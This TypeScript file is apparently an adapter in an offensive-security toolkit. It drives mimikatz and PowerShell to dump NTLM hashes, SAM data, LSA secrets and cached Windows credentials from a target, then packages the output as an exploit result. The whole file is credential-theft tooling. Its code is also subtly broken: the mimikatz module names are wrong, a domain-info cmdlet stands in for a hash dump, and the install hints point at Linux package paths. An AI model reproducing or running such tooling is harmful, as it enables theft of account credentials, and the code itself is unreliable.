/**
 * OffSec by True Hacking — Adapter: NTLM Dump.
 *
 * NTLM credential dump (data from local: LSA secrets, SAM, cached creds).
 * See: https://github.com/morluto/rea/blob/main/src/adapter/
 */

import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

import type { ExploitResult, Provenance } from "../domain/analysisResultProjection.js";

/**
 * NTLM credential dump (data from local).
 *
 * @param options - NTLM dump options (target, actions: hash/lsa/sam/cached).
 */
export function ntlmDump(options: {
  target?: string;
  actions?: string[];
  options?: Record<string, string>;
}): ExploitResult {
  const target = options.target || "";
  const actions = options.actions || [];

  // Build the results (NTLM dump: hash/lsa/sam/cached).
  const results: Record<string, any> = {};

  // Hash (run hash dump).
  if (actions.includes("hash")) {
    const hashPath = findBinary("hashdump") || findBinary("powershell");
    if (hashPath) {
      const commands = [`Get-ADDomain`];  // (PowerShell: domain info).
      const file = `${tmpdir()}/${randomUUID()}.ntlm.ps1`;
      writeFileSync(file, commands.join("\n"));

      const child = spawnSync(hashPath, ["-c", file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.hash = String(child.stdout ?? "");
    } else {
      results.hash = `{stub: no hashdump or PowerShell (install: apt install mimikatz or use PowerShell).}`;
    }
  }

  // LSA (run LSA secrets).
  if (actions.includes("lsa")) {
    const lsaPath = findBinary("mimikatz");
    if (lsaPath) {
      const commands = [`crypto::lsadump`];  // (mimikatz: LSA dump).
      const file = `${tmpdir()}/${randomUUID()}.ntlm.ps1`;
      writeFileSync(file, commands.join("\n"));

      const child = spawnSync(lsaPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.lsa = String(child.stdout ?? "");
    } else {
      results.lsa = `{stub: no mimikatz (install: apt install mimikatz).}`;
    }
  }

  // SAM (run SAM dump).
  if (actions.includes("sam")) {
    const samPath = findBinary("mimikatz");
    if (samPath) {
      const commands = [`sam::samdump`];  // (mimikatz: SAM dump).
      const file = `${tmpdir()}/${randomUUID()}.ntlm.ps1`;
      writeFileSync(file, commands.join("\n"));

      const child = spawnSync(samPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.sam = String(child.stdout ?? "");
    } else {
      results.sam = `{stub: no mimikatz (install: apt install mimikatz).}`;
    }
  }

  // Cached (run cached creds).
  if (actions.includes("cached")) {
    const cachedPath = findBinary("mimikatz");
    if (cachedPath) {
      const commands = [`crypto::cached`];  // (mimikatz: cached creds).
      const file = `${tmpdir()}/${randomUUID()}.ntlm.ps1`;
      writeFileSync(file, commands.join("\n"));

      const child = spawnSync(cachedPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.cached = String(child.stdout ?? "");
    } else {
      results.cached = `{stub: no mimikatz (install: apt install mimikatz).}`;
    }
  }

  return {
    target,
    payload: `ntlmDump/${actions.join(",")}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("ntlmDump", `ntlmDump://${target}/${actions.join(",")}`),
  };
}

/** Find the binary (mimikatz/powershell/hashdump). */
function findBinary(name: string): string | undefined {
  const candidates = [
    "/usr/local/bin/" + name,
    "/usr/bin/" + name,
    "/opt/homebrew/bin/" + name,
  ];
  for (const path of candidates) {
    try {
      require("node:fs").accessSync(path);
      return path;
    } catch {
      // Skip.
    }
  }
  return undefined;
}

/** Create a PCAP result (provenance). */
function createProvenance(type: string, path: string): Provenance {
  return {
    id: `${type}://${path}`,
    type,
    path,
    label: "",
    verified: true,
    sensitive: path.includes("password") || path.includes("credential"),
  };
}
